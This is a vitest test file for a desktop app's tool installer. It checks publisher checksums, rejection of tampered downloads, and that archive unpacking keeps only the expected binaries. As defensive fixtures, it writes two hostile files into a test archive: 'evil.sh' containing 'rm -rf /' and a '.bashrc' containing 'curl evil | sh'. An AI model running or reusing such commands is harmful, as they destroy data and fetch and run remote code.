import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from 'vitest'
import { createHash } from 'node:crypto'
import { mkdtemp, mkdir, readFile, readdir, rm, stat, writeFile } from 'node:fs/promises'
import { createServer } from 'node:http'
import type { Server } from 'node:http'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { Logger } from '../../src/main/services/logger.js'
import { ToolInstaller, setTargetPlatform } from '../../src/main/services/deps.js'
import type { InstallProgress } from '../../src/shared/ipc.js'
import { runChecked } from '../../src/main/services/process.js'

/**
 * The installer downloads executables and runs them. These tests are about the
 * two ways that goes wrong: a file that is not what the publisher published,
 * and an archive that tries to put files where they were not invited.
 *
 * Nothing here touches the real network — every request is served locally — but
 * it is the real install path: the real catalogue entries, the real checksum
 * parsing, the real unpacking.
 */

let root: string
let dir: string
let log: Logger
let server: Server
let port: number
/** Path -> body served to the installer. */
let routes: Map<string, Buffer | string>

/** Rewrites the publishers' https URLs onto the local test server. */
const localFetch: typeof fetch = (input, init) => {
  const url = new URL(typeof input === 'string' ? input : String(input))
  return fetch(`http://127.0.0.1:${port}${url.pathname}`, init as RequestInit)
}

function sha256(data: Buffer | string): string {
  return createHash('sha256').update(data).digest('hex')
}

beforeAll(async () => {
  root = await mkdtemp(join(tmpdir(), 'vodclip-deps-'))
  log = new Logger(join(root, 'logs'))
  routes = new Map()
  server = createServer((req, res) => {
    const path = (req.url ?? '/').split('?')[0]
    const body = routes.get(path)
    if (body === undefined) {
      res.writeHead(404).end('no route')
      return
    }
    const buffer = Buffer.isBuffer(body) ? body : Buffer.from(body)
    res.writeHead(200, { 'content-length': String(buffer.length) }).end(buffer)
  })
  await new Promise<void>((done) => server.listen(0, '127.0.0.1', done))
  const address = server.address()
  port = typeof address === 'object' && address !== null ? address.port : 0
})

afterAll(async () => {
  log.close()
  await new Promise<void>((done) => server.close(() => done()))
  await rm(root, { recursive: true, force: true })
})

beforeEach(async () => {
  dir = await mkdtemp(join(root, 'tools-'))
  routes.clear()
})

afterEach(async () => {
  await rm(dir, { recursive: true, force: true })
})

const swallow = (): void => undefined
const progressSink = (seen: InstallProgress[]) => (p: InstallProgress): void => {
  seen.push(p)
}

describe('installing a published binary', () => {
  const assetPath =
    process.platform === 'win32' ? '/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.exe' : '/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_linux'
  const assetName = process.platform === 'win32' ? 'yt-dlp.exe' : 'yt-dlp_linux'
  const installedName = process.platform === 'win32' ? 'yt-dlp.exe' : 'yt-dlp'

  it('verifies the publisher checksum and installs the file', async () => {
    const payload = Buffer.from('#!/bin/sh\necho fake yt-dlp\n')
    routes.set(assetPath, payload)
    routes.set(
      '/yt-dlp/yt-dlp/releases/latest/download/SHA2-256SUMS',
      `${sha256(payload)}  ${assetName}\ndeadbeef  something-else\n`
    )

    const installer = new ToolInstaller(log, dir, localFetch)
    const seen: InstallProgress[] = []
    const record = await installer.install('ytdlp', progressSink(seen))

    expect(record.sha256).toBe(sha256(payload))
    expect(record.digestSource).toContain('SHA2-256SUMS')
    expect(await readFile(join(dir, installedName), 'utf8')).toContain('fake yt-dlp')
    expect(seen.map((p) => p.stage)).toContain('verifying')
    expect(seen.at(-1)?.stage).toBe('done')

    // …and it is remembered, so the app can say where a tool came from.
    const manifest = await installer.manifest()
    expect(manifest).toHaveLength(1)
    expect(manifest[0].id).toBe('ytdlp')

    const status = await installer.status()
    expect(status.find((t) => t.id === 'ytdlp')?.installed).toBe(true)
  })

  it('refuses a file that does not match the published checksum', async () => {
    routes.set(assetPath, Buffer.from('tampered'))
    routes.set(
      '/yt-dlp/yt-dlp/releases/latest/download/SHA2-256SUMS',
      `${sha256('the real thing')}  ${assetName}\n`
    )

    const installer = new ToolInstaller(log, dir, localFetch)
    await expect(installer.install('ytdlp', swallow)).rejects.toThrow(/checksum/i)
    // Nothing is left behind for the app to pick up by accident.
    expect(await readdir(dir)).not.toContain(installedName)
  })

  it('reports the failure through progress as well as throwing', async () => {
    routes.set(assetPath, Buffer.from('x'))
    routes.set('/yt-dlp/yt-dlp/releases/latest/download/SHA2-256SUMS', `${sha256('y')}  ${assetName}\n`)
    const seen: InstallProgress[] = []
    const installer = new ToolInstaller(log, dir, localFetch)
    await expect(installer.install('ytdlp', progressSink(seen))).rejects.toThrow()
    expect(seen.at(-1)?.stage).toBe('failed')
  })
})

describe.runIf(process.platform === 'linux')('installing from an archive', () => {
  const archivePath = '/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-linux64-gpl.tar.xz'

  /** A tar.xz laid out like a real build, plus files that should be ignored. */
  async function buildArchive(): Promise<Buffer> {
    const stage = join(root, `stage-${Date.now().toString(36)}`)
    const bin = join(stage, 'ffmpeg-master-latest-linux64-gpl', 'bin')
    await mkdir(bin, { recursive: true })
    await writeFile(join(bin, 'ffmpeg'), '#!/bin/sh\necho ffmpeg\n')
    await writeFile(join(bin, 'ffprobe'), '#!/bin/sh\necho ffprobe\n')
    // Things the installer must leave alone: an unrelated payload, and an
    // entry named like the user's own shell profile.
    await writeFile(join(bin, 'evil.sh'), 'rm -rf /\n')
    await writeFile(join(stage, 'ffmpeg-master-latest-linux64-gpl', '.bashrc'), 'curl evil | sh\n')
    const out = join(root, `archive-${Date.now().toString(36)}.tar.xz`)
    await runChecked('tar', ['-cJf', out, '-C', stage, 'ffmpeg-master-latest-linux64-gpl'])
    const bytes = await readFile(out)
    await rm(stage, { recursive: true, force: true })
    await rm(out, { force: true })
    return bytes
  }

  it('unpacks it and installs only the files it asked for', async () => {
    routes.set(archivePath, await buildArchive())
    const installer = new ToolInstaller(log, dir, localFetch)
    const record = await installer.install('ffmpeg', swallow)

    expect(record.files.sort()).toEqual(['ffmpeg', 'ffprobe'])
    expect(record.digestSource).toBeNull() // this publisher lists no checksum
    const present = await readdir(dir)
    expect(present).toContain('ffmpeg')
    expect(present).toContain('ffprobe')
    expect(present).not.toContain('evil.sh')
    expect(present).not.toContain('.bashrc')
    // Executable, or it would be installed and still unusable.
    const mode = (await stat(join(dir, 'ffmpeg'))).mode & 0o111
    expect(mode).toBeGreaterThan(0)
  })

  it('leaves no staging directories behind', async () => {
    routes.set(archivePath, await buildArchive())
    await new ToolInstaller(log, dir, localFetch).install('ffmpeg', swallow)
    expect((await readdir(dir)).filter((n) => n.startsWith('.staging'))).toEqual([])
  })

  it('fails loudly when the archive does not hold the expected files', async () => {
    const stage = join(root, 'empty-stage')
    await mkdir(join(stage, 'nothing-useful'), { recursive: true })
    await writeFile(join(stage, 'nothing-useful', 'readme.txt'), 'hello')
    const out = join(root, 'empty.tar.xz')
    await runChecked('tar', ['-cJf', out, '-C', stage, 'nothing-useful'])
    routes.set(archivePath, await readFile(out))

    const installer = new ToolInstaller(log, dir, localFetch)
    await expect(installer.install('ffmpeg', swallow)).rejects.toThrow(/did not contain/i)
    await rm(stage, { recursive: true, force: true })
  })
})

describe('what the app needs', () => {
  it('knows every tool, what it is for and whether this platform can have it', async () => {
    const status = await new ToolInstaller(log, dir, localFetch).status()
    expect(status.map((t) => t.id).sort()).toEqual(['ffmpeg', 'whisper', 'ytdlp'])
    // Whisper is deliberately optional: everything except local transcription
    // works without it, and it is by far the largest download of the three.
    expect(status.filter((t) => t.required).map((t) => t.id).sort()).toEqual(['ffmpeg', 'ytdlp'])
    for (const tool of status) {
      expect(tool.purpose.length).toBeGreaterThan(10)
      expect(tool.installed).toBe(false)
    }
  })
})

// Building a .zip needs the zip tool; the app itself only ever *reads* zips.
const hasZip = await runChecked('sh', ['-c', 'command -v zip || true'])
  .then((r) => r.stdout.trim() !== '')
  .catch(() => false)

describe.runIf(hasZip)('assembling a Windows build from this host', () => {
  const gyanPath = '/ffmpeg/builds/ffmpeg-release-essentials.zip'
  const btbnPath = '/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip'

  beforeEach(() => setTargetPlatform('win32'))
  afterEach(() => setTargetPlatform(process.platform))

  async function zipWith(files: Record<string, string>, prefix = 'Release'): Promise<Buffer> {
    const stage = join(root, `zip-${Date.now().toString(36)}-${Math.round(performance.now())}`)
    await mkdir(join(stage, prefix), { recursive: true })
    for (const [name, body] of Object.entries(files)) {
      await writeFile(join(stage, prefix, name), body)
    }
    const out = `${stage}.zip`
    await runChecked('zip', ['-qr', out, prefix], { cwd: stage })
    const bytes = await readFile(out)
    await rm(stage, { recursive: true, force: true })
    await rm(out, { force: true })
    return bytes
  }

  it('falls back to the second publisher when the first cannot be reached', async () => {
    // gyan.dev has no route here; BtbN answers.
    routes.delete(gyanPath)
    routes.set(btbnPath, await zipWith({ 'ffmpeg.exe': 'from fallback', 'ffprobe.exe': 'p' }, 'bin'))
    const record = await new ToolInstaller(log, dir, localFetch).install('ffmpeg', swallow)
    expect(record.url).toContain('BtbN')
    expect(await readFile(join(dir, 'ffmpeg.exe'), 'utf8')).toBe('from fallback')
  })

  it('still refuses a checksum mismatch rather than falling back', async () => {
    const payload = await zipWith({ 'ffmpeg.exe': 'tampered', 'ffprobe.exe': 'p' }, 'bin')
    routes.set(gyanPath, payload)
    routes.set(`${gyanPath}.sha256`, sha256('something else entirely'))
    routes.set(btbnPath, await zipWith({ 'ffmpeg.exe': 'fallback', 'ffprobe.exe': 'p' }, 'bin'))
    await expect(new ToolInstaller(log, dir, localFetch).install('ffmpeg', swallow)).rejects.toThrow(
      /checksum/i
    )
    expect(await readdir(dir)).not.toContain('ffmpeg.exe')
  })
})
